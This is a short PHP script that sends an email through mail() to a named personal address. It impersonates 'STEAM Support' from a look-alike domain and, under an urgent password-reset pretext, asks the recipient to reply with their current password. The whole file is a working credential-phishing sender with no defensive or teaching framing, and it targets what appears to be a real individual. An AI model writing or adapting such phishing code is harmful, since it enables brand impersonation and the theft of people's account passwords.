<?php

$to = "satyadas39@gmail.com";

$subject = "[URGENT] Password Reset Request" ;

$txt = "Hi Satya, we received a password reset request from your account. Could you reply with your current password and someone

                 from our team will get in touch with you shortly

<br>

Reagrds,<br>

Support Team";

$headers = "STEAM Support <steamsupport@supportrequest.com>" . "\r

            \n";



mail($to,$subject,$txt,$headers);

?>